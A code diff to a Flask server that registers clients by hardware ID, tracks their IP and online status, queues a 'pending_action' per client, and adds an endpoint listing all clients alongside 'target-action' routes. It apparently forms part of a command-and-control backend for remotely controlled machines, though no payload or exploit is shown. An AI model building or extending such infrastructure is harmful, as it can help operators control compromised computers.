@@ -29,18 +29,37 @@ def heartbeat():
         if not hwid:
             return jsonify({"status": "error", "message": "Missing HWID"}), 400
             
-        ip_addr = request.remote_addr
+        if request.headers.get('X-Forwarded-For'):
+            ip_addr = request.headers.get('X-Forwarded-For').split(',')[0].strip()
+        else:
+            ip_addr = request.remote_addr
+
         ref = db.reference(f'clients/{hwid}')
-        ref.update({
+        client_data = ref.get() or {}
+        
+        update_payload = {
             'ip': ip_addr,
             'status': 'ONLINE',
             'last_seen': 'Active Live'
-        })
+        }
+        
+        if 'pending_action' not in client_data:
+            update_payload['pending_action'] = ''
+
+        ref.update(update_payload)
         return jsonify({"status": "registered", "assigned_hwid": hwid})
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)}), 500
 
-# Lahat ng posibleng route variation para iwas 404
+@app.route('/api/clients', methods=['GET'])
+def get_clients():
+    try:
+        ref = db.reference('clients')
+        clients_data = ref.get() or {}
+        return jsonify(clients_data)
+    except Exception as e:
+        return jsonify({"status": "error", "message": str(e)}), 500
+
 @app.route('/api/target-action', methods=['POST', 'GET'])
 @app.route('/target-action', methods=['POST', 'GET'])
 @app.route('/action', methods=['POST', 'GET'])
